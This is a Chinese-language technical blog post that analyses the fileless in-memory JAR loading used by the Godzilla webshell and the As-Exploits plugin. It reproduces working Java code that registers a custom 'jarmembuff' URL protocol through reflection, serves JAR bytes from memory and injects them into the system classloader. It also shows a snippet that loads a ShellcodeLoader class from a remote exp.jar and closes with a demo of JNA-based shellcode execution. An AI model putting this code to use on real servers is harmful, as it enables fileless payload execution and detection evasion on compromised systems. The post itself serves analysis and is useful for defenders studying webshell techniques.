# 分析哥斯拉内存加载Jar技术




<meta name="referrer" content="no-referrer" />

## 背景
哥斯拉在第一版的时候就提供了一个黑魔法：内存加载Jar功能。从当时的介绍来看，这个功能本来是为上传数据库驱动用的，后面配合JNA可以实现无文件加载ShellCode，一切都在内存中执行，大大扩展了利用面。

要知道JDK默认没有提供直接内存加载Jar的接口，但是我们可以想到，既然JDK是支持通过http/file协议加载Jar包，也就是这里面一定存在着：读取Jar包内容->加载到内存->defineClass的链路，如果我们能够把第一步跳过去，直接把Jar的byte复制到内存中，就可以实现无文件加载。同样，Java原生是不支持内存加载so或者dll的，但是我们可以通过内存加载Jar的方式，在Jar中包含我们要利用的so/dll即可实现曲线救国。

As-Exploits很早就把这个功能移植了过来，不过目前似乎并没有找到有写分析这个功能的文章，本文抛砖引玉，简单分析分析。

## findResource流程分析
在了解无文件加载Jar原理之前，首先了解一下JVM是如何查找Class的
Class.forName后下一个断点，进入java.net.URLClassLoader#findClass，这里有一个很重要的属性ucp，包含了所有的URL实例
![image.png](https://cdn.nlark.com/yuque/0/2023/png/1599908/1694917795837-c229294b-c7e0-4017-a012-3c9a99966748.png#averageHue=%23f2f0ef&clientId=u0951b4c9-cea3-4&from=paste&height=568&id=u46d6481a&originHeight=1136&originWidth=2102&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1355616&status=done&style=none&taskId=u97f95d6b-7b84-4530-a6dc-95f773b3d66&title=&width=1051)
然后会通过ClassLoader中的ucp属性尝试获取目标类的Resource，这里调用的是sun.misc.URLClassPath#getResource(java.lang.String, boolean)，主要逻辑为遍历ucp下所有的URL对象进行资源的查找：sun.misc.URLClassPath.JarLoader#getResource(java.lang.String, boolean)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/1599908/1694918194842-36d84d25-18d0-4df1-a369-1266eb35b376.png#averageHue=%23fbfbfb&clientId=u0951b4c9-cea3-4&from=paste&height=412&id=ubfe1106e&originHeight=824&originWidth=1434&originalType=binary&ratio=2&rotation=0&showTitle=false&size=533439&status=done&style=none&taskId=u29d62082-3921-443b-b7a0-00087943902&title=&width=717)

找到目标Class对应所在Resource对象后，则会走入java.net.URLClassLoader#defineClass方法，进行类的加载
![image.png](https://cdn.nlark.com/yuque/0/2023/png/1599908/1694919723701-64cc134e-fa54-4319-bf51-6bff256ed215.png#averageHue=%23f9f7f6&clientId=u0951b4c9-cea3-4&from=paste&height=609&id=u714accb0&originHeight=1218&originWidth=1914&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1303337&status=done&style=none&taskId=ua779053c-5e9b-4965-a303-4fdfb91d805&title=&width=957)
## URLClassPath与URL
上面的过程涉及到两个重要的类，直接贴一下ChatGPT的描述：
sun.misc.URLClassPath类和java.net.URL类在Java中都与URL（统一资源定位符）相关联，但它们的作用和职责不同。

java.net.URL类是Java标准库中的一个类，用于表示一个统一资源定位符。它提供了许多方法来解析、构建和处理URL。URL对象可以用于打开连接、获取流等操作，以访问网络资源。

sun.misc.URLClassPath类是Java虚拟机（JVM）的一部分，并不属于公共API，它被用于支持类加载器加载和查找类文件。在类的查找过程中，URLClassPath负责管理类加载路径、查找类文件并加载类。

具体来说，当Java程序运行时，JVM的类加载器负责根据类的名称来查找并加载相应的类文件。URLClassPath类是JVM中的一个关键组件，它通过封装一组URL对象（其中包含了可能包含类文件的目录或JAR文件的URL）来提供类的查找功能。URLClassPath通过调用java.net.URL类提供的方法来解析和构建URL对象，并利用这些URL对象来定位和加载类文件。

因此，可以说URLClassPath类是在类加载过程中起着重要的作用，它与java.net.URL类密切合作，使用URL来定位并加载类文件。
## HTTP远程加载Jar包原理
知道了findResource的原理，后面就好理解为什么下面的的代码可以远程加载一个Jar包了：实际上就是把我们自定义的远程URL加入到了ucp属性中，后续通过该URL中提供的协议进行类的查找
```
URLClassLoader loader = new URLClassLoader(new URL[]{new URL("http://yzddmr6.com/exp.jar")});
loader.loadClass("asexploits.ShellcodeLoader");
```

为了摸清这一过程，我们用上面的代码对http协议加载Jar包过程进行调试：
在java.net.URL#URL(java.net.URL, java.lang.String, java.net.URLStreamHandler)断点，发现会根据获取到的协议方式拿到不同的handler，例如http://yzddmr6.com/exp.jar，就会获取http的handler，file:///tmp/exp.jar就会获取file类型的hander
java.net.URL#getURLStreamHandler
![image.png](https://cdn.nlark.com/yuque/0/2023/png/1599908/1695716083244-7b1991b1-a19d-4e6e-9d9e-5c8d723cc48b.png#averageHue=%23f8f8f7&clientId=ud0545662-3e42-4&from=paste&height=281&id=ub031aefa&originHeight=562&originWidth=1376&originalType=binary&ratio=2&rotation=0&showTitle=false&size=406999&status=done&style=none&taskId=u4e6dccca-8e76-4a94-9ae7-8ca097daba5&title=&width=688)
之前查找到的hander会被保存到handlers整个缓存中，如果没有就会进行一个包名的拼接: "sun.net.www.protocol"+protocol+".Handler"，找到对应的处理类
![image.png](https://cdn.nlark.com/yuque/0/2023/png/1599908/1695716144135-94fe472d-bd6b-4300-9f58-3d869e9d8e36.png#averageHue=%23faf9f9&clientId=ud0545662-3e42-4&from=paste&height=717&id=u1724cb75&originHeight=1434&originWidth=2176&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1393027&status=done&style=none&taskId=ua85e48ba-578a-4792-a6eb-69a1777de52&title=&width=1088)
其实这里的协议是可以构造的，例如我们可以设置一种abc://127.0.0.1/exp.jar，就会识别为abc协议
![image.png](https://cdn.nlark.com/yuque/0/2023/png/1599908/1695892142236-144ea13d-e26c-42a1-941b-3978ece796fe.png#averageHue=%23fcfbfb&clientId=ud0545662-3e42-4&from=paste&height=341&id=XsuBH&originHeight=682&originWidth=1582&originalType=binary&ratio=2&rotation=0&showTitle=false&size=491630&status=done&style=none&taskId=u4bfa2aa6-b904-48fc-9dd5-d65b50c375e&title=&width=791)
然后在java.net.URL#getURLStreamHandler判断如果handlers里没有缓存，就会尝试去寻找sun.net.www.protocol.abc.Handler这个类，这里handlers属性是一个重点。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/1599908/1695892285685-e7435d10-e8af-49ea-955d-1acd93935378.png#averageHue=%23f8f8f6&clientId=ud0545662-3e42-4&from=paste&height=340&id=ZTKDC&originHeight=680&originWidth=1368&originalType=binary&ratio=2&rotation=0&showTitle=false&size=497182&status=done&style=none&taskId=u6d16c17b-0f72-4cc2-9828-fc2680acd1d&title=&width=684)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/1599908/1695892230380-bd045b94-439b-4184-b8b1-b762e3eaefdc.png#averageHue=%23faf9f8&clientId=ud0545662-3e42-4&from=paste&height=449&id=DdUp1&originHeight=898&originWidth=1942&originalType=binary&ratio=2&rotation=0&showTitle=false&size=835161&status=done&style=none&taskId=uea714707-297e-4f61-a1ca-738e0a44eb6&title=&width=971)

除了sun.net.www.protocol.http.Handler以外，默认的JDK还支持以下协议，可以看看：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/1599908/1695892470067-0eee7d21-0eb7-4fb5-89a8-56959355f096.png#averageHue=%23fcfce4&clientId=ud0545662-3e42-4&from=paste&height=541&id=psofe&originHeight=1082&originWidth=686&originalType=binary&ratio=2&rotation=0&showTitle=false&size=376833&status=done&style=none&taskId=u46295c04-fa45-4966-95b0-860f892a080&title=&width=343)

后续就会依次经过以下步骤，
java.net.URL#openConnection
java.net.URL#openStream
sun.misc.URLClassPath.JarLoader#getJarFile(java.net.URL)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/1599908/1695718661502-ba5b12b5-a099-4e87-857d-15f03961d056.png#averageHue=%23f8f7f6&clientId=ud0545662-3e42-4&from=paste&height=565&id=u68fa22a9&originHeight=1130&originWidth=1454&originalType=binary&ratio=2&rotation=0&showTitle=false&size=784357&status=done&style=none&taskId=u9dc0205a-2b70-46bf-bf61-2bfd29b4cc6&title=&width=727)
在sun.net.www.protocol.http.Handler#openConnection(java.net.URL, java.net.Proxy)中会返回一个新的HttpURLConnection对象，该对象主要负责具体对远程地址的请求，获取Jar的内容。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/1599908/1696666632054-61766db3-d565-4f81-a36a-b9138027598d.png#averageHue=%23fcfbf8&clientId=ud0545662-3e42-4&from=paste&height=119&id=u8aed1086&originHeight=149&originWidth=862&originalType=binary&ratio=2&rotation=0&showTitle=false&size=17473&status=done&style=none&taskId=uf6bb3fac-2ac2-4dcd-9205-951c5d89570&title=&width=689.6)

可以看到在http协议加载Jar过程中有两个重要的类：

- sun.net.www.protocol.http.HttpURLConnection
- sun.net.www.protocol.http.Handler

这两个类都与HTTP协议相关，在Java中用于处理HTTP连接和请求：

- sun.net.www.protocol.http.HttpURLConnection类是Java标准库中的一个类，它继承自java.net.HttpURLConnection类，用于创建HTTP连接并发送HTTP请求。它提供了一组方法来设置请求的参数、发送请求、获取响应等操作，使开发者可以通过该类与远程服务器进行HTTP通信。
- sun.net.www.protocol.http.Handler类是Java虚拟机（JVM）中的一个实现类，它实现了java.net.URLStreamHandler接口。URLStreamHandler接口定义了处理不同URL协议的方法，而sun.net.www.protocol.http.Handler类具体处理HTTP协议。它负责解析并处理URL对象中的HTTP部分，包括建立HTTP连接、发送HTTP请求等操作，这些操作实际是由HttpURLConnection来实现。

这两个类是获取Jar包内容的核心所在，想要实现内存加载Jar的关键部分就在这里。
## 内存加载Jar原理
综合看下来，最简单的办法就是实现一套自定义一套协议，在http协议的基础上修改获取Jar的逻辑，这也是beichen师傅的做法
### 增加自定义protocol
在哥斯拉中叫jarmembuff，在这里我们直接把协议跟对应的handler塞到URL对象的handlers缓存中，核心代码：
```
Field declaredField = null;
files = new ArrayList();

try {
    declaredField = URL.class.getDeclaredField("handlers");
} catch (NoSuchFieldException var7) {
    try {
        declaredField = URL.class.getDeclaredField("ph_cache");
    } catch (NoSuchFieldException var5) {
    } catch (Exception var6) {
    }
}

declaredField.setAccessible(true);
Map map = (Map) declaredField.get(null);
synchronized (map) {
    Object memoryBufferURLStreamHandler;
    if (map.containsKey("jarmembuff")) {
        memoryBufferURLStreamHandler = map.get("jarmembuff");
    } else {
        memoryBufferURLStreamHandler = new MemoryBufferURLStreamHandler();
        map.put("jarmembuff", memoryBufferURLStreamHandler);
    }

    files = (List) memoryBufferURLStreamHandler.getClass().getMethod("getFiles").invoke(memoryBufferURLStreamHandler);
}
```
### 实现自定义URLStreamHandler
MemoryBufferURLStreamHandler中openConnection直接返回自定义的URLConnection类，用于获取Jar的内容
```
import java.io.IOException;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.ArrayList;
import java.util.List;

public class MemoryBufferURLStreamHandler extends URLStreamHandler {
    private final List files = new ArrayList();

    public MemoryBufferURLStreamHandler() {
    }

    public List getFiles() {
        return this.files;
    }

    public URLConnection openConnection(URL url) throws IOException {
        return new MemoryBufferURLConnection(url);
    }
}

```
### 实现自定义URLConnection
MemoryBufferURLConnection，在getInputStream方法中直接返回要加载Jar包的byte数组，该数组内容可以自定义传入，即内存加载
```
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class MemoryBufferURLConnection extends URLConnection {
    private static List files;
    private final String contentType;
    private final byte[] data;

    protected MemoryBufferURLConnection(URL url) {
        super(url);
        String file = url.getFile();
        int indexOf = file.indexOf(47);
        synchronized (files) {
            this.data = (byte[]) files.get(Integer.parseInt(file.substring(0, indexOf)));
        }

        this.contentType = file.substring(indexOf + 1);
    }

    public static URL createURL(byte[] bArr, String str) throws MalformedURLException {
        synchronized (files) {
            files.add(bArr);
            URL url = new URL("jarmembuff", "", files.size() - 1 + "/" + str);
            return url;
        }
    }

    public void connect() throws IOException {
    }

    public int getContentLength() {
        return this.data.length;
    }

    public String getContentType() {
        return this.contentType;
    }

    public InputStream getInputStream() throws IOException {
        return new ByteArrayInputStream(this.data); // 直接返回内存中的内容
    }
}

```

### 添加到SystemClassLoader的ucp中
调用时首先将两个类打入内存上下文，然后调用MemoryBufferURLConnection的createURL创建构造好的URL对象，最后通过反射塞到SystemClassLoader的ucp中
```
public String load(byte[] jarClassData) {
    Class URLConnectionClass = null;
    try {
        String MemoryBufferURLConnection = "";
        String MemoryBufferURLStreamHandler = "";
        defClz(Base64DecodeToByte(MemoryBufferURLStreamHandler));
        URLConnectionClass = defClz(Base64DecodeToByte(MemoryBufferURLConnection));
    } catch (Exception e) {

    }
    if (jarClassData != null) {
        try {
            return addJar((URL) URLConnectionClass.getMethod("createURL", byte[].class, String.class).invoke(null, jarClassData, "application/jar"));
        } catch (Exception e) {
            return e.getMessage();
        }
    } else {
        return "jarByteArray is null";
    }
}
```
### files对象
这里哥斯拉有一个小细节，MemoryBufferURLStreamHandler中有一个没有使用过的files对象，研究了一下是什么作用
![image.png](https://cdn.nlark.com/yuque/0/2023/png/1599908/1695894141876-21cce173-43d9-4959-abce-6bd3bed325f5.png#averageHue=%23fbfaf9&clientId=ud0545662-3e42-4&from=paste&height=426&id=ylMuN&originHeight=852&originWidth=1222&originalType=binary&ratio=2&rotation=0&showTitle=false&size=505330&status=done&style=none&taskId=u0d81d1c7-5d47-4a9c-9757-bd8b111b1a5&title=&width=611)
其实是因为MemoryBufferURLConnection每次是new出来的，无法保存之前加载过的Jar内容，这里的List是一个浅拷贝，链接到MemoryBufferURLStreamHandler实例对象中，这样就可以在每次new之后依旧保留曾经加载过的jar，不需要重复加载。
## 适配高版本JDK
JDK9实现了模块化，SystemClassLoader不再是URLClassLoader的子类，所以原有的Poc就不能直接用了。520师傅后来进行了一系列改进，支持了高版本JDK。其实基本原理差不多，主要是用[https://github.com/BeichenDream/Kcon2021Code](https://github.com/BeichenDream/Kcon2021Code)中的trick绕过JDK了模块保护和反射过滤
## As-Exploits内存加载ShellCode
通过Jar加载器-内存加载，上传ext目录下的loader.jar
![image.png](https://cdn.nlark.com/yuque/0/2023/png/1599908/1696668416161-4df3612f-2a06-4978-96a6-ed8ac4668247.png#averageHue=%23f7f7f6&clientId=ud0545662-3e42-4&from=paste&height=654&id=ua29c213d&originHeight=817&originWidth=1375&originalType=binary&ratio=2&rotation=0&showTitle=false&size=37802&status=done&style=none&taskId=u90a475c8-88a9-4ee9-8df6-3c6002469a0&title=&width=1100)
可以通过Js引擎执行功能先试一下看类在不在，发现确实可以查找到
![image.png](https://cdn.nlark.com/yuque/0/2023/png/1599908/1696668481406-8ba1cf83-b93e-4233-9e23-c77cbef02367.png#averageHue=%23f7f7f6&clientId=ud0545662-3e42-4&from=paste&height=647&id=uc7a585b1&originHeight=809&originWidth=1373&originalType=binary&ratio=2&rotation=0&showTitle=false&size=37057&status=done&style=none&taskId=uacd8a506-9e65-4e2f-afb2-999a6583281&title=&width=1098.4)
ShellCode加载器模块-加载方式JNA，exploit，弹出计算器，也就实现了内存加载ShellCode的功能
![image.png](https://cdn.nlark.com/yuque/0/2023/png/1599908/1696668561833-0eda2d8f-5319-4b96-9e76-b991071702cf.png#averageHue=%23f5f5f4&clientId=ud0545662-3e42-4&from=paste&height=638&id=ua0c9ac8a&originHeight=797&originWidth=1363&originalType=binary&ratio=2&rotation=0&showTitle=false&size=90448&status=done&style=none&taskId=u962b0acd-af0b-4f28-8bf2-53c1de993eb&title=&width=1090.4)

